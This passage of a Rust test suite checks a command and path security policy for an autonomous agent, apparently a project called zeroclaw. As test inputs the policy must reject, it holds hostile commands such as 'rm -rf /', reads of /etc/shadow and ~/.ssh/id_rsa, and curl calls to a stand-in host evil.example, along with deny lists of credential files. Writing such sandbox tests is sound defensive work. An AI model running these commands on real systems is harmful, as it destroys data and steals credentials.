        assert!(!p.is_command_allowed("cat <(echo pwned)"));
        assert!(!p.is_command_allowed("ls >(cat /etc/passwd)"));
    }

    #[test]
    fn command_env_var_prefix_with_allowed_cmd() {
        let p = default_policy();
        // env assignment + allowed command — OK
        assert!(p.is_command_allowed("FOO=bar ls"));
        assert!(p.is_command_allowed("LANG=C grep pattern file"));
        // env assignment + disallowed command — blocked
        assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
    }

    #[test]
    fn forbidden_path_argument_detects_absolute_path() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("cat /etc/passwd"),
            Some("/etc/passwd".into())
        );
    }

    #[test]
    fn validate_command_execution_rejects_forbidden_paths() {
        let p = default_policy();
        let err = p
            .validate_command_execution("cat /etc/shadow", false)
            .unwrap_err();
        assert!(err.contains("Path blocked by security policy"));
    }

    #[test]
    fn forbidden_path_argument_detects_parent_dir_reference() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("cat ../secret.txt"),
            Some("../secret.txt".into())
        );
        assert_eq!(
            p.forbidden_path_argument("find .. -name '*.rs'"),
            Some("..".into())
        );
    }

    #[test]
    fn forbidden_path_argument_allows_workspace_relative_paths() {
        let p = default_policy();
        assert_eq!(p.forbidden_path_argument("cat src/main.rs"), None);
        assert_eq!(p.forbidden_path_argument("grep -r todo ./src"), None);
    }

    #[test]
    fn forbidden_path_argument_allows_path_inside_allowed_root_under_forbidden_parent() {
        let root = std::env::temp_dir().join("zeroclaw_test_cmd_forbidden_allowed_overlap");
        let forbidden = root.join("forbidden_root");
        let allowed = forbidden.join("allowed_root");
        let nested = allowed.join("nested").join("file.txt");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(nested.parent().unwrap()).unwrap();

        let p = SecurityPolicy {
            workspace_only: true,
            forbidden_paths: vec![forbidden.display().to_string()],
            allowed_roots: vec![allowed],
            ..SecurityPolicy::default()
        };

        assert_eq!(
            p.forbidden_path_argument(&format!("cat {}", nested.display())),
            None
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn forbidden_path_argument_honors_relative_forbidden_and_allowed_root_specificity() {
        let root = std::env::temp_dir().join("zeroclaw_test_cmd_relative_forbidden_allowed");
        let workspace = root.join("workspace");
        let allowed = workspace.join("sandbox").join("allow");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(allowed.join("nested")).unwrap();
        std::fs::create_dir_all(workspace.join("sandbox").join("private")).unwrap();

        let p = SecurityPolicy {
            workspace_dir: workspace.clone(),
            workspace_only: true,
            forbidden_paths: vec!["sandbox".into(), "sandbox/private".into()],
            allowed_roots: vec![allowed],
            ..SecurityPolicy::default()
        };

        assert_eq!(
            p.forbidden_path_argument("cat sandbox/allow/nested/file.txt"),
            None
        );
        assert_eq!(
            p.forbidden_path_argument("cat sandbox/private/key.txt"),
            Some("sandbox/private/key.txt".into())
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn forbidden_path_argument_detects_option_assignment_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("grep --file=/etc/passwd root ./src"),
            Some("/etc/passwd".into())
        );
        assert_eq!(
            p.forbidden_path_argument("cat --input=../secret.txt"),
            Some("../secret.txt".into())
        );
    }

    #[test]
    fn forbidden_path_argument_allows_safe_option_assignment_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("grep --file=./patterns.txt root ./src"),
            None
        );
    }

    #[test]
    fn forbidden_path_argument_detects_short_option_attached_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("grep -f/etc/passwd root ./src"),
            Some("/etc/passwd".into())
        );
        assert_eq!(
            p.forbidden_path_argument("git -C../outside status"),
            Some("../outside".into())
        );
    }

    #[test]
    fn forbidden_path_argument_allows_safe_short_option_attached_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("grep -f./patterns.txt root ./src"),
            None
        );
        assert_eq!(p.forbidden_path_argument("git -C./repo status"), None);
    }

    #[test]
    fn forbidden_path_argument_detects_tilde_user_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("cat ~root/.ssh/id_rsa"),
            Some("~root/.ssh/id_rsa".into())
        );
        assert_eq!(
            p.forbidden_path_argument("ls ~nobody"),
            Some("~nobody".into())
        );
    }

    #[test]
    fn forbidden_path_argument_detects_input_redirection_paths() {
        let p = default_policy();
        assert_eq!(
            p.forbidden_path_argument("cat </etc/passwd"),
            Some("/etc/passwd".into())
        );
        assert_eq!(
            p.forbidden_path_argument("cat</etc/passwd"),
            Some("/etc/passwd".into())
        );
    }

    // ── Edge cases: path traversal ──────────────────────────

    #[test]
    fn path_traversal_encoded_dots() {
        let p = default_policy();
        // Literal ".." in path — always blocked
        assert!(!p.is_path_allowed("foo/..%2f..%2fetc/passwd"));
    }

    #[test]
    fn path_traversal_double_dot_in_filename() {
        let p = default_policy();
        // ".." in a filename (not a path component) is allowed
        assert!(p.is_path_allowed("my..file.txt"));
        // But actual traversal components are still blocked
        assert!(!p.is_path_allowed("../etc/passwd"));
        assert!(!p.is_path_allowed("foo/../etc/passwd"));
    }

    #[test]
    fn path_with_null_byte_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("file\0.txt"));
    }

    #[test]
    fn path_symlink_style_absolute() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/proc/self/root/etc/passwd"));
    }

    #[test]
    fn path_home_tilde_ssh() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~/.gnupg/secring.gpg"));
        assert!(!p.is_path_allowed("~root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~nobody"));
    }

    #[test]
    fn path_var_run_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/var/run/docker.sock"));
    }

    // ── Edge cases: rate limiter boundary ────────────────────

    #[test]
    fn rate_limit_exactly_at_boundary() {
        let p = SecurityPolicy {
            max_actions_per_hour: 1,
            ..SecurityPolicy::default()
        };
        assert!(p.record_action()); // 1 — exactly at limit
        assert!(!p.record_action()); // 2 — over
        assert!(!p.record_action()); // 3 — still over
    }

    #[test]
    fn rate_limit_zero_blocks_everything() {
        let p = SecurityPolicy {
            max_actions_per_hour: 0,
            ..SecurityPolicy::default()
        };
        assert!(!p.record_action());
    }

    #[test]
    fn rate_limit_high_allows_many() {
        let p = SecurityPolicy {
            max_actions_per_hour: 10000,
            ..SecurityPolicy::default()
        };
        for _ in 0..100 {
            assert!(p.record_action());
        }
    }

    // ── Edge cases: autonomy + command combos ────────────────

    #[test]
    fn readonly_blocks_even_safe_commands() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            allowed_commands: vec!["ls".into(), "cat".into()],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("cat"));
        assert!(!p.can_act());
    }

    #[test]
    fn supervised_allows_listed_commands() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            allowed_commands: vec!["git".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("git status"));
        assert!(!p.is_command_allowed("docker ps"));
    }

    #[test]
    fn full_autonomy_still_respects_forbidden_paths() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/etc/shadow"));
        assert!(!p.is_path_allowed("/root/.bashrc"));
    }

    #[test]
    fn workspace_only_false_allows_resolved_outside_workspace() {
        let workspace = std::env::temp_dir().join("zeroclaw_test_ws_only_false");
        let _ = std::fs::create_dir_all(&workspace);
        let canonical_workspace = workspace
            .canonicalize()
            .unwrap_or_else(|_| workspace.clone());

        let p = SecurityPolicy {
            workspace_dir: canonical_workspace.clone(),
            workspace_only: false,
            forbidden_paths: vec!["/etc".into(), "/var".into()],
            ..SecurityPolicy::default()
        };

        // Path outside workspace should be allowed when workspace_only=false
        let outside = std::env::var_os("HOME")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("/home"))
            .join("zeroclaw_outside_ws");
        assert!(
            p.is_resolved_path_allowed(&outside),
            "workspace_only=false must allow resolved paths outside workspace"
        );

        // Forbidden paths must still be blocked even with workspace_only=false
        assert!(
            !p.is_resolved_path_allowed(Path::new("/etc/passwd")),
            "forbidden paths must be blocked even when workspace_only=false"
        );
        assert!(
            !p.is_resolved_path_allowed(Path::new("/var/run/docker.sock")),
            "forbidden /var must be blocked even when workspace_only=false"
        );

        let _ = std::fs::remove_dir_all(&workspace);
    }

    #[test]
    fn workspace_only_true_blocks_resolved_outside_workspace() {
        let workspace = std::env::temp_dir().join("zeroclaw_test_ws_only_true");
        let _ = std::fs::create_dir_all(&workspace);
        let canonical_workspace = workspace
            .canonicalize()
            .unwrap_or_else(|_| workspace.clone());

        let p = SecurityPolicy {
            workspace_dir: canonical_workspace.clone(),
            workspace_only: true,
            ..SecurityPolicy::default()
        };

        // Path inside workspace — allowed
        let inside = canonical_workspace.join("subdir");
        assert!(
            p.is_resolved_path_allowed(&inside),
            "path inside workspace must be allowed"
        );

        // Path outside workspace — blocked
        let outside = std::env::temp_dir()
            .canonicalize()
            .unwrap_or_else(|_| std::env::temp_dir())
            .join("zeroclaw_outside_ws_true");
        assert!(
            !p.is_resolved_path_allowed(&outside),
            "workspace_only=true must block resolved paths outside workspace"
        );

        let _ = std::fs::remove_dir_all(&workspace);
    }

    // ── Edge cases: from_config preserves tracker ────────────

    #[test]
    fn from_config_creates_fresh_tracker() {
        let autonomy_config = crate::config::AutonomyConfig {
            level: AutonomyLevel::Full,
            workspace_only: false,
            allowed_commands: vec![],
            forbidden_paths: vec![],
            max_actions_per_hour: 10,
            max_cost_per_day_cents: 100,
            require_approval_for_medium_risk: true,
            block_high_risk_commands: true,
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);
        assert_eq!(policy.tracker.count(), 0);
        assert!(!policy.is_rate_limited());
    }

    #[test]
    fn from_config_command_context_rules_apply_to_runtime_enforcement() {
        let mut autonomy_config = crate::config::AutonomyConfig::default();
        autonomy_config.level = AutonomyLevel::Full;
        autonomy_config.block_high_risk_commands = false;
        autonomy_config.allowed_commands = vec!["curl".into()];
        autonomy_config.command_context_rules = vec![crate::config::CommandContextRuleConfig {
            command: "curl".into(),
            action: crate::config::CommandContextRuleAction::Deny,
            allowed_domains: vec!["evil.example".into()],
            allowed_path_prefixes: vec![],
            denied_path_prefixes: vec![],
            allow_high_risk: false,
        }];

        let workspace = std::env::temp_dir().join("zeroclaw_test_command_context_rules_runtime");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        let allowed = policy
            .validate_command_execution_with_reason("curl https://api.example.com/data", true)
            .expect("non-matching domain should remain allowed");
        assert_eq!(allowed, CommandRiskLevel::High);

        let violation = policy
            .validate_command_execution_with_reason("curl https://evil.example/data", true)
            .expect_err("matching deny rule domain should be blocked");
        assert_eq!(violation.policy_id(), "autonomy.command_context_rules");
        assert!(violation.to_string().contains("deny rule matched"));
        assert!(violation.to_string().contains("rule_action=deny"));
        assert!(violation.to_string().contains("rule_command=curl"));
        assert!(violation
            .to_string()
            .contains("allowed_domains=evil.example"));
    }

    #[test]
    fn command_context_rules_runtime_allows_matched_command() {
        let mut autonomy_config = crate::config::AutonomyConfig::default();
        autonomy_config.level = AutonomyLevel::Full;
        autonomy_config.allowed_commands = vec![];
        autonomy_config.block_high_risk_commands = true;
        autonomy_config.command_context_rules = vec![crate::config::CommandContextRuleConfig {
            command: "curl".into(),
            action: crate::config::CommandContextRuleAction::Allow,
            allowed_domains: vec!["api.example.com".into()],
            allowed_path_prefixes: vec![],
            denied_path_prefixes: vec![],
            allow_high_risk: true,
        }];

        let workspace =
            std::env::temp_dir().join("zeroclaw_test_command_context_rules_runtime_allow_match");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        let allowed = policy
            .validate_command_execution_with_reason("curl https://api.example.com/data", true)
            .expect("matching allow rule should permit runtime command execution");
        assert_eq!(allowed, CommandRiskLevel::High);

        let blocked = policy
            .validate_command_execution_with_reason("curl https://evil.example/data", true)
            .expect_err("non-matching domain should remain blocked");
        assert_eq!(blocked.policy_id(), "autonomy.command_context_rules");
        assert!(blocked
            .to_string()
            .contains("no allow rule matched constraints"));
        assert!(blocked.to_string().contains("command_context="));
        assert!(blocked.to_string().contains("observed_hosts=evil.example"));
    }

    #[test]
    fn command_context_rules_runtime_blocks_before_global_allowlist() {
        let mut autonomy_config = crate::config::AutonomyConfig::default();
        autonomy_config.level = AutonomyLevel::Full;
        autonomy_config.allowed_commands = vec!["curl".into()];
        autonomy_config.block_high_risk_commands = false;
        autonomy_config.command_context_rules = vec![crate::config::CommandContextRuleConfig {
            command: "curl".into(),
            action: crate::config::CommandContextRuleAction::Allow,
            allowed_domains: vec!["api.example.com".into()],
            allowed_path_prefixes: vec![],
            denied_path_prefixes: vec![],
            allow_high_risk: false,
        }];

        let workspace =
            std::env::temp_dir().join("zeroclaw_test_command_context_rules_allowlist_priority");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        let blocked = policy
            .validate_command_execution_with_reason("curl https://evil.example/data", true)
            .expect_err(
                "context rule constraints must block even when command is globally allowlisted",
            );

        assert_eq!(blocked.policy_id(), "autonomy.command_context_rules");
        assert!(blocked
            .to_string()
            .contains("no allow rule matched constraints"));
        assert!(blocked.to_string().contains("rule_command=curl"));
        assert!(blocked.to_string().contains("observed_hosts=evil.example"));
    }

    #[test]
    fn command_context_rules_preflight_reports_structured_block_event() {
        let mut autonomy_config = crate::config::AutonomyConfig::default();
        autonomy_config.level = AutonomyLevel::Full;
        autonomy_config.allowed_commands = vec![];
        autonomy_config.block_high_risk_commands = true;
        autonomy_config.command_context_rules = vec![crate::config::CommandContextRuleConfig {
            command: "curl".into(),
            action: crate::config::CommandContextRuleAction::Allow,
            allowed_domains: vec!["api.example.com".into()],
            allowed_path_prefixes: vec![],
            denied_path_prefixes: vec![],
            allow_high_risk: true,
        }];

        let workspace =
            std::env::temp_dir().join("zeroclaw_test_command_context_rules_preflight_event");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        let blocked = action_command_preflight_with_approval_violation(
            &policy,
            "shell command execution",
            Some("curl https://evil.example/data"),
            true,
        )
        .expect("non-matching allow constraints must be blocked during preflight");

        assert_eq!(blocked.policy_id(), "autonomy.command_context_rules");
        assert_eq!(blocked.command_fragment(), "curl https://evil.example/data");
        assert!(blocked
            .to_string()
            .contains("no allow rule matched constraints"));
        assert!(blocked.to_string().contains("allow_rule_count=1"));
    }

    // ── summary_for_heartbeat ──────────────────────────────

    #[test]
    fn summary_for_heartbeat_contains_key_fields() {
        let policy = default_policy();
        let summary = policy.summary_for_heartbeat();
        assert!(summary.contains("Autonomy:"));
        assert!(summary.contains("supervised"));
        assert!(summary.contains("Workspace:"));
        assert!(summary.contains("workspace_only: true"));
        assert!(summary.contains("Forbidden paths:"));
        assert!(summary.contains("/etc"));
        assert!(summary.contains("Allowed commands:"));
        assert!(summary.contains("git"));
        assert!(summary.contains("High-risk commands: blocked"));
        assert!(summary.contains("Do not exfiltrate data"));
    }

    #[test]
    fn summary_for_heartbeat_truncates_long_lists() {
        let policy = SecurityPolicy {
            forbidden_paths: (0..15).map(|i| format!("/path_{i}")).collect(),
            allowed_commands: (0..12).map(|i| format!("cmd_{i}")).collect(),
            ..SecurityPolicy::default()
        };
        let summary = policy.summary_for_heartbeat();
        // Only first 8 shown, remainder counted
        assert!(summary.contains("+ 7 more"));
        assert!(summary.contains("+ 4 more rejected"));
    }

    #[test]
    fn summary_for_heartbeat_full_autonomy() {
        let policy = full_policy();
        let summary = policy.summary_for_heartbeat();
        assert!(summary.contains("full"));
        assert!(summary.contains("autonomous execution"));
    }

    #[test]
    fn summary_for_heartbeat_readonly_autonomy() {
        let policy = readonly_policy();
        let summary = policy.summary_for_heartbeat();
        assert!(summary.contains("read_only"));
        assert!(summary.contains("side-effecting actions are blocked"));
    }

    // ══════════════════════════════════════════════════════════
    // SECURITY CHECKLIST TESTS
    // Checklist: gateway not public, pairing required,
    //            filesystem scoped (no /), access via tunnel
    // ══════════════════════════════════════════════════════════

    // ── Checklist #3: Filesystem scoped (no /) ──────────────

    #[test]
    fn checklist_root_path_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/"));
        assert!(!p.is_path_allowed("/anything"));
    }

    #[test]
    fn checklist_all_system_dirs_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        for dir in [
            "/etc", "/root", "/home", "/usr", "/bin", "/sbin", "/lib", "/opt", "/boot", "/dev",
            "/proc", "/sys", "/var", "/tmp", "/mnt",
        ] {
            assert!(
                !p.is_path_allowed(dir),
                "System dir should be blocked: {dir}"
            );
            assert!(
                !p.is_path_allowed(&format!("{dir}/subpath")),
                "Subpath of system dir should be blocked: {dir}/subpath"
            );
        }
    }

    #[test]
    fn checklist_sensitive_dotfiles_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        for path in [
            "~/.ssh/id_rsa",
            "~/.gnupg/secring.gpg",
            "~/.aws/credentials",
            "~/.config/secrets",
        ] {
            assert!(
                !p.is_path_allowed(path),
                "Sensitive dotfile should be blocked: {path}"
            );
        }
    }

    #[test]
    fn checklist_null_byte_injection_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("safe\0/../../../etc/passwd"));
        assert!(!p.is_path_allowed("\0"));
        assert!(!p.is_path_allowed("file\0"));
    }

    #[test]
    fn checklist_workspace_only_blocks_all_absolute() {
        let p = SecurityPolicy {
            workspace_only: true,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/any/absolute/path"));
        assert!(p.is_path_allowed("relative/path.txt"));
    }

    #[test]
    fn checklist_resolved_path_must_be_in_workspace() {
        let p = SecurityPolicy {
            workspace_dir: PathBuf::from("/home/user/project"),
            ..SecurityPolicy::default()
        };
        // Inside workspace — allowed
        assert!(p.is_resolved_path_allowed(Path::new("/home/user/project/src/main.rs")));
        // Outside workspace — blocked (symlink escape)
        assert!(!p.is_resolved_path_allowed(Path::new("/etc/passwd")));
        assert!(!p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
        // Root — blocked
        assert!(!p.is_resolved_path_allowed(Path::new("/")));
    }

    #[test]
    fn checklist_default_policy_is_workspace_only() {
        let p = SecurityPolicy::default();
        assert!(
            p.workspace_only,
            "Default policy must be workspace_only=true"
        );
    }

    #[test]
    fn checklist_default_forbidden_paths_comprehensive() {
        let p = SecurityPolicy::default();
        // Must contain all critical system dirs
        for dir in [
            "/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp", "/mnt",
        ] {
            assert!(
                p.forbidden_paths.iter().any(|f| f == dir),
                "Default forbidden_paths must include {dir}"
            );
        }
        // Must contain sensitive dotfiles
        for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
            assert!(
                p.forbidden_paths.iter().any(|f| f == dot),
                "Default forbidden_paths must include {dot}"
            );
        }
    }

    // ── §1.2 Path resolution / symlink bypass tests ──────────

    #[test]
    fn resolved_path_blocks_outside_workspace() {
        let workspace = std::env::temp_dir().join("zeroclaw_test_resolved_path");
        let _ = std::fs::create_dir_all(&workspace);

        // Use the canonicalized workspace so starts_with checks match
        let canonical_workspace = workspace
            .canonicalize()
            .unwrap_or_else(|_| workspace.clone());

        let policy = SecurityPolicy {
            workspace_dir: canonical_workspace.clone(),
            ..SecurityPolicy::default()
        };

        // A resolved path inside the workspace should be allowed
        let inside = canonical_workspace.join("subdir").join("file.txt");
        assert!(
            policy.is_resolved_path_allowed(&inside),
            "path inside workspace should be allowed"
        );

        // A resolved path outside the workspace should be blocked
        let canonical_temp = std::env::temp_dir()
            .canonicalize()
            .unwrap_or_else(|_| std::env::temp_dir());
        let outside = canonical_temp.join("outside_workspace_zeroclaw");
        assert!(
            !policy.is_resolved_path_allowed(&outside),
            "path outside workspace must be blocked"
        );

        let _ = std::fs::remove_dir_all(&workspace);
    }

    #[test]
    fn resolved_path_blocks_root_escape() {
        let policy = SecurityPolicy {
            workspace_dir: PathBuf::from("/home/zeroclaw_user/project"),
            ..SecurityPolicy::default()
        };

        assert!(
            !policy.is_resolved_path_allowed(Path::new("/etc/passwd")),
            "resolved path to /etc/passwd must be blocked"
        );
        assert!(
            !policy.is_resolved_path_allowed(Path::new("/root/.bashrc")),
            "resolved path to /root/.bashrc must be blocked"
        );
    }

    #[cfg(unix)]
    #[test]
    fn resolved_path_blocks_symlink_escape() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join("zeroclaw_test_symlink_escape");
        let workspace = root.join("workspace");
        let outside = root.join("outside_target");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&workspace).unwrap();
        std::fs::create_dir_all(&outside).unwrap();

        // Create a symlink inside workspace pointing outside
        let link_path = workspace.join("escape_link");
        symlink(&outside, &link_path).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace.clone(),
            ..SecurityPolicy::default()
        };

        // The resolved symlink target should be outside workspace
        let resolved = link_path.canonicalize().unwrap();
        assert!(
            !policy.is_resolved_path_allowed(&resolved),
            "symlink-resolved path outside workspace must be blocked"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[cfg(unix)]
    #[test]
    fn allowed_roots_permits_paths_outside_workspace() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join("zeroclaw_test_allowed_roots");
        let workspace = root.join("workspace");
        let extra = root.join("extra_root");
        let extra_file = extra.join("data.txt");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&workspace).unwrap();
        std::fs::create_dir_all(&extra).unwrap();
        std::fs::write(&extra_file, "test").unwrap();

        // Symlink inside workspace pointing to extra root
        let link_path = workspace.join("link_to_extra");
        symlink(&extra, &link_path).unwrap();

        let resolved = link_path.join("data.txt").canonicalize().unwrap();

        // Without allowed_roots — blocked (symlink escape)
        let policy_without = SecurityPolicy {
            workspace_dir: workspace.clone(),
            allowed_roots: vec![],
            ..SecurityPolicy::default()
        };
        assert!(
            !policy_without.is_resolved_path_allowed(&resolved),
            "without allowed_roots, symlink target must be blocked"
        );

        // With allowed_roots — permitted
        let policy_with = SecurityPolicy {
            workspace_dir: workspace.clone(),
            allowed_roots: vec![extra.clone()],
            ..SecurityPolicy::default()
        };
        assert!(
            policy_with.is_resolved_path_allowed(&resolved),
            "with allowed_roots containing the target, symlink must be allowed"
        );

        // Unrelated path still blocked
        let unrelated = root.join("unrelated");
        std::fs::create_dir_all(&unrelated).unwrap();
        assert!(
            !policy_with.is_resolved_path_allowed(&unrelated.canonicalize().unwrap()),
            "paths outside workspace and allowed_roots must still be blocked"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn resolved_allowed_root_overrides_broader_forbidden_parent() {
        let root = std::env::temp_dir().join("zeroclaw_test_resolved_forbidden_allowed_overlap");
        let workspace = root.join("workspace");
        let forbidden = root.join("forbidden_root");
        let allowed = forbidden.join("allowed_root");
        let nested = allowed.join("nested");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&workspace).unwrap();
        std::fs::create_dir_all(&nested).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace.clone(),
            workspace_only: true,
            forbidden_paths: vec![forbidden.display().to_string()],
            allowed_roots: vec![allowed],
            ..SecurityPolicy::default()
        };

        let resolved = nested.canonicalize().unwrap();
        assert!(
            policy.is_resolved_path_allowed(&resolved),
            "resolved paths inside an explicitly allowlisted subroot must stay accessible"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn resolved_relative_forbidden_parent_honors_more_specific_allowed_root() {
        let root = std::env::temp_dir().join("zeroclaw_test_resolved_relative_forbidden_allowed");
        let workspace = root.join("workspace");
        let nested = workspace.join("sandbox").join("allow").join("nested");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&nested).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace.clone(),
            workspace_only: true,
            forbidden_paths: vec!["sandbox".into()],
            allowed_roots: vec![workspace.join("sandbox").join("allow")],
            ..SecurityPolicy::default()
        };

        let resolved = nested.canonicalize().unwrap();
        assert!(
            policy.is_resolved_path_allowed(&resolved),
            "resolved paths should honor a more specific allowed_root over a workspace-relative forbidden parent"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn resolved_workspace_forbidden_path_is_blocked_even_inside_workspace() {
        let root = std::env::temp_dir().join("zeroclaw_test_resolved_workspace_forbidden");
        let workspace = root.join("workspace");
        let secret = workspace.join("secret").join("nested");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&secret).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace.clone(),
            workspace_only: true,
            forbidden_paths: vec!["secret".into()],
            ..SecurityPolicy::default()
        };

        let resolved = secret.canonicalize().unwrap();
        assert!(
            !policy.is_resolved_path_allowed(&resolved),
            "workspace-local forbidden paths must remain blocked after resolution"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[cfg(unix)]
    #[test]
    fn resolved_workspace_forbidden_path_blocks_symlink_aliases_inside_workspace() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join("zeroclaw_test_workspace_forbidden_symlink_alias");
        let workspace = root.join("workspace");
        let secret = workspace.join("secret");
        let alias = workspace.join("alias");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(secret.join("nested")).unwrap();
        symlink(&secret, &alias).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace.clone(),
            workspace_only: true,
            forbidden_paths: vec!["secret".into()],
            ..SecurityPolicy::default()
        };

        let resolved = alias.join("nested").canonicalize().unwrap();
        assert!(
            !policy.is_resolved_path_allowed(&resolved),
            "workspace-local symlink aliases must not bypass forbidden_paths"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn is_path_allowed_blocks_null_bytes() {
        let policy = default_policy();
        assert!(
            !policy.is_path_allowed("file\0.txt"),
            "paths with null bytes must be blocked"
        );
    }

    #[test]
    fn is_path_allowed_blocks_url_encoded_traversal() {
        let policy = default_policy();
        assert!(
            !policy.is_path_allowed("..%2fetc%2fpasswd"),
            "URL-encoded path traversal must be blocked"
        );
        assert!(
            !policy.is_path_allowed("subdir%2f..%2f..%2fetc"),
            "URL-encoded parent dir traversal must be blocked"
        );
    }
}
